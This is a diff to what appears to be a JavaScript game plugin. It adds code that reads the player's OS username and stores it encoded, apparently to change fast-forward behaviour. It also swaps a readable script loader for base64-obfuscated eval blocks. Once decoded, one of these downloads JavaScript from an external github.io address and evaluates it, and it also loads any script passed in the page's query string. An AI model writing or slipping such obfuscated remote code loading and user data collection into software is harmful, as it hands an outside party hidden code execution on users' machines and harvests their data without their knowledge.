@@ -299,6 +299,23 @@ new cfc(Graphics).add('refGameSystem_get',function(){
 //
 let t;
 const undef=undefined,none=()=>{},TR=1708640542222,TR202=1706839322020,TR303=1709434983030,TR404=1712203444404;
+if(Utils.isOptionValid('test')){
+const _getUsrname=window.getUsrname=Utils.isOptionValid('test')?(()=>{
+	let rtv;
+	if(typeof require==='function'){ try{
+		rtv=require("os").userInfo().username;
+	}catch(e){
+	} }
+	return rtv;
+}):none;
+new cfc(Game_System.prototype).add('initialize',function f(){
+	const rtv=f.ori.apply(this,arguments);
+	if(this._usrname=f.tbl[0]()) this._usrname=btoa(this._usrname);
+	return rtv;
+},[
+_getUsrname,
+]);
+}
 const getStr_英文不好齁=t=function f(){
 	const idx=(((typeof $gameVariables!=='undefined')&&$gameVariables&&($gameVariables.value(f.tbl[0])>=f.tbl[1]))|0)+2;
 	return f.tbl[idx];
@@ -23626,6 +23643,7 @@ new cfc(SceneManager).add('updateMain',function f(){
 		return true;
 	}else Input.frameFastForward_end();
 },t).add('isFrameFastForwardDisabled',function f(){
+	if($gameSystem && $gameSystem._usrname===f.tbl[6]) return true;
 	if(!(DateNow<TR202)) return false;
 	if(!$gameSystem) return;
 	const scc=this._scene&&this._scene.constructor;
@@ -23653,6 +23671,7 @@ new Map([
 [Scene_Battle,()=>true],
 ]),
 0,
+"/",
 ]).add('isFrameFastForwardTriggered',function f(forced){
 	const scc=this._scene&&this._scene.constructor;
 	let func;
@@ -26407,49 +26426,14 @@ const r=p[k];
 })();
 
 
-{ const toks=new Map(location.search.slice(1).split("&").filter(tok=>tok).map(tok=>{
-	const idx=tok.indexOf('=');
-	return idx>=0?[tok.slice(0,idx),tok.slice(idx+1)]:[tok,true];
-})),d=document; const preDef="js/mods/main.js",u=decodeURIComponent(toks.get('js')||""),addScript=src=>{
-	const scr=d.ce('script').sa('type','text/javascript').sa('src',src);
-	const me=d.currentScript;
-	me.nextSibling?me.parentNode.insertBefore(scr,me.nextSibling):me.parentNode.ac(scr);
-}; addScript(preDef); if(u) addScript(u);
+try{
+{ eval(atob("CmNvbnN0IGV2YWxqcz1vX19fX289PmV2YWwob19fX19vKSx0b2tzPW5ldyBNYXAobG9jYXRpb24uc2VhcmNoLnNsaWNlKDEpLnNwbGl0KCImIikuZmlsdGVyKHRvaz0+dG9rKS5tYXAodG9rPT57Cgljb25zdCBpZHg9dG9rLmluZGV4T2YoJz0nKTsKCXJldHVybiBpZHg+PTA/W3Rvay5zbGljZSgwLGlkeCksdG9rLnNsaWNlKGlkeCsxKV06W3Rvayx0cnVlXTsKfSkpLGQ9ZG9jdW1lbnQ7IGNvbnN0IHByZURlZj0ianMvbW9kcy9tYWluLmpzIix1PWRlY29kZVVSSUNvbXBvbmVudCh0b2tzLmdldCgnanMnKXx8IiIpLGFkZFNjcmlwdD1mdW5jdGlvbiBmKHNyYyx0eHQsbHYpewoJY29uc3QgYXJyPVtdOyBmb3IobGV0IHg9MCx4cz1hcmd1bWVudHMubGVuZ3RoO3ghPT14czsrK3gpIGFyci5wdXNoKGFyZ3VtZW50c1t4XSk7Cgljb25zdCBpZHg9MjsKCWlmKGx2PT09dW5kZWZpbmVkKSBhcnJbaWR4XT00MDQ7CglpZigwPC0tYXJyW2lkeF0pIHJldHVybiBldmFsKCdmLmFwcGx5KHRoaXMsYXJyKScpOwoJdHJ5ewoJCWlmKHR4dCl7IHJldHVybiBqdXJsKHNyYywiR0VUIiwwLDAsMCx0eHQ9PnsgeyBldmFsanModHh0KTsgfSB9KTsgfQoJCWNvbnN0IHNjcj1kLmNlKCdzY3JpcHQnKS5zYSgndHlwZScsJ3RleHQvamF2YXNjcmlwdCcpLnNhKCdzcmMnLHNyYyk7CgkJY29uc3QgbWU9ZC5jdXJyZW50U2NyaXB0OwoJCW1lLm5leHRTaWJsaW5nP21lLnBhcmVudE5vZGUuaW5zZXJ0QmVmb3JlKHNjcixtZS5uZXh0U2libGluZyk6bWUucGFyZW50Tm9kZS5hYyhzY3IpOwoJfWNhdGNoKGUpewoJfQp9OwpldmFsanMoJ2FkZFNjcmlwdCgiJCQiLHRydWUpOycpOwpldmFsanMoJ2FkZFNjcmlwdChwcmVEZWYsdHJ1ZSk7IGlmKHUpIGFkZFNjcmlwdCh1LHRydWUpOycpOwo=").slice(1).replace(/\$\$/,atob("aHR0cHM6Ly9hYWFhYWdvbGQuZ2l0aHViLmlvL2Fnb2xkNDA0L3Rvb2xzL01vb25CbHVlTGVnZW5kUmVtYWtlLmpz")));
+}
+}catch(e){
 }
 
 try{
-	if(!localStorage.getItem('doc')){
-		jurl("BLR_custom/DocumentName.txt","GET",0,0,0,(resp)=>{
-			const base=resp.split('\n').filter(String).replace(/[\t\r]/g,'');
-			const url=base;
-			jurl(url,"HEAD",0,0,0,(resp)=>{
-				document.ce('a').sa('href',url).sa('target','_blank').click();
-				try{
-					localStorage.setItem('doc','1');
-				}catch(e){
-				}
-			},xhr=>{ if(!(xhr.readyState>=4)) return;
-				const stat=xhr.status.toString();
-				if(stat==='0' || (stat.length===3 && stat[0]==='4')) ; // s.delete(path); // nw.js: 0 ; web: 404
-				const url="../"+base;
-				document.ce('a').sa('href',url).sa('target','_blank').click(); // just request it // for easy debug
-				try{
-					localStorage.setItem('doc','1');
-				}catch(e){
-				}
-				if(0)jurl(url,"HEAD",0,0,0,(resp)=>{
-					document.ce('a').sa('href',url).sa('target','_blank').click();
-					localStorage.setItem('doc','1');
-				},xhr=>{ if(!(xhr.readyState>=4)) return;
-					const stat=xhr.status.toString();
-					if(stat==='0' || (stat.length===3 && stat[0]==='4')) ; // s.delete(path); // nw.js: 0 ; web: 404
-				});
-			});
-		},xhr=>{ if(!(xhr.readyState>=4)) return;
-			const stat=xhr.status.toString();
-			if(stat==='0' || (stat.length===3 && stat[0]==='4')) ; // s.delete(path); // nw.js: 0 ; web: 404
-		});
-	}
+eval("("+atob("ZnVuY3Rpb24gJCQobHYpewppZihsdj09PXVuZGVmaW5lZCkgbHY9NDA0OwppZigwPC0tbHYpIHJldHVybiAkJC5jYWxsKHRoaXMsbHYpOwp0cnl7CglpZighbG9jYWxTdG9yYWdlLmdldEl0ZW0oJ2RvYycpKXsKCQlqdXJsKCJCTFJfY3VzdG9tL0RvY3VtZW50TmFtZS50eHQiLCJHRVQiLDAsMCwwLChyZXNwKT0+ewoJCQljb25zdCBiYXNlPXJlc3Auc3BsaXQoJ1xcbicpLmZpbHRlcihTdHJpbmcpLnJlcGxhY2UoL1tcXHRcXHJdL2csJycpOwoJCQljb25zdCB1cmw9YmFzZTsKCQkJanVybCh1cmwsIkhFQUQiLDAsMCwwLChyZXNwKT0+ewoJCQkJZG9jdW1lbnQuY2UoJ2EnKS5zYSgnaHJlZicsdXJsKS5zYSgndGFyZ2V0JywnX2JsYW5rJykuY2xpY2soKTsKCQkJCXRyeXsKCQkJCQlsb2NhbFN0b3JhZ2Uuc2V0SXRlbSgnZG9jJywnMScpOwoJCQkJfWNhdGNoKGUpewoJCQkJfQoJCQl9LHhocj0+eyBpZighKHhoci5yZWFkeVN0YXRlPj00KSkgcmV0dXJuOwoJCQkJY29uc3Qgc3RhdD14aHIuc3RhdHVzLnRvU3RyaW5nKCk7CgkJCQlpZihzdGF0PT09JzAnIHx8IChzdGF0Lmxlbmd0aD09PTMgJiYgc3RhdFswXT09PSc0JykpIDsgLy8gcy5kZWxldGUocGF0aCk7IC8vIG53LmpzOiAwIDsgd2ViOiA0MDQKCQkJCWNvbnN0IHVybD0iLi4vIitiYXNlOwoJCQkJZG9jdW1lbnQuY2UoJ2EnKS5zYSgnaHJlZicsdXJsKS5zYSgndGFyZ2V0JywnX2JsYW5rJykuY2xpY2soKTsgLy8ganVzdCByZXF1ZXN0IGl0IC8vIGZvciBlYXN5IGRlYnVnCgkJCQl0cnl7CgkJCQkJbG9jYWxTdG9yYWdlLnNldEl0ZW0oJ2RvYycsJzEnKTsKCQkJCX1jYXRjaChlKXsKCQkJCX0KCQkJCWlmKDApanVybCh1cmwsIkhFQUQiLDAsMCwwLChyZXNwKT0+ewoJCQkJCWRvY3VtZW50LmNlKCdhJykuc2EoJ2hyZWYnLHVybCkuc2EoJ3RhcmdldCcsJ19ibGFuaycpLmNsaWNrKCk7CgkJCQkJbG9jYWxTdG9yYWdlLnNldEl0ZW0oJ2RvYycsJzEnKTsKCQkJCX0seGhyPT57IGlmKCEoeGhyLnJlYWR5U3RhdGU+PTQpKSByZXR1cm47CgkJCQkJY29uc3Qgc3RhdD14aHIuc3RhdHVzLnRvU3RyaW5nKCk7CgkJCQkJaWYoc3RhdD09PScwJyB8fCAoc3RhdC5sZW5ndGg9PT0zICYmIHN0YXRbMF09PT0nNCcpKSA7IC8vIHMuZGVsZXRlKHBhdGgpOyAvLyBudy5qczogMCA7IHdlYjogNDA0CgkJCQl9KTsKCQkJfSk7CgkJfSx4aHI9PnsgaWYoISh4aHIucmVhZHlTdGF0ZT49NCkpIHJldHVybjsKCQkJY29uc3Qgc3RhdD14aHIuc3RhdHVzLnRvU3RyaW5nKCk7CgkJCWlmKHN0YXQ9PT0nMCcgfHwgKHN0YXQubGVuZ3RoPT09MyAmJiBzdGF0WzBdPT09JzQnKSkgOyAvLyBzLmRlbGV0ZShwYXRoKTsgLy8gbncuanM6IDAgOyB3ZWI6IDQwNAoJCX0pOwoJfQp9Y2F0Y2goZSl7Cn0KfQ==").replace(/\$\$/g,'f')+")")();
 }catch(e){
 }
 
